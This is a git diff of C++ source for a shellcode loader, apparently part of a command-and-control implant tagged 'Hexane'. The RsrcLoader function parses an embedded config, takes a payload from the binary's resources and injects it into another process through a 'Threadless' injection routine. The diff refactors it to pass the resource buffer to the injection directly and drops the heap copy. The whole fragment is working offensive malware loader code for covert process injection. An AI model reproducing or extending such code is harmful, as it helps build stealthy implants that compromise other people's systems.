@@ -10,11 +10,9 @@ VOID Entrypoint(HMODULE Base) {
 VOID RsrcLoader(HMODULE Base) {
         HEXANE
 
-        PRSRC Rsrc          = { };
-        PARSER Parser       = { };
-        LPVOID Shellcode    = { };
-        SIZE_T cbShellcode  = 0;
-        SIZE_T ccbShellcode = 0;
+        PRSRC Rsrc              = { };
+        PARSER Parser           = { };
+        THREADLESS Threadless   = { };
 
         Memory::ResolveApi();
         Parser::CreateParser(&Parser, Config, sizeof(Config));
@@ -26,7 +24,6 @@ VOID RsrcLoader(HMODULE Base) {
         Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->Root), nullptr);
         Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->LE), nullptr);
 
-        THREADLESS Threadless = { };
         Parser::ParserStrcpy(&Parser, &Threadless.Parent.Buffer, &Threadless.Parent.Length);
         Parser::ParserStrcpy(&Parser, &Threadless.Module.Buffer, &Threadless.Module.Length);
         Parser::ParserStrcpy(&Parser, &Threadless.Export.Buffer, &Threadless.Export.Length);
@@ -38,20 +35,10 @@ VOID RsrcLoader(HMODULE Base) {
                 return;
         }
 
-        Shellcode = Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, Rsrc->Size);
+        Injection::Threadless(Threadless, Rsrc->ResLock, Rsrc->Size, Threadless.Loader.Length + Rsrc->Size);
 
-        cbShellcode = Rsrc->Size;
-        ccbShellcode = Threadless.Loader.Length + Rsrc->Size;
-
-        MmPatchData(i, RCAST(PBYTE, Shellcode), (i), RCAST(PBYTE, Rsrc->ResLock), (i), cbShellcode);
         Ctx->win32.FreeResource(Rsrc->hGlobal);
-
-        Injection::Threadless(Threadless, Shellcode, cbShellcode, ccbShellcode);
-
-        if (Shellcode) {
-                x_memset(Shellcode, 0, Rsrc->Size);
-        }
-
         Parser::DestroyParser(&Parser);
+
         Execute();
 }
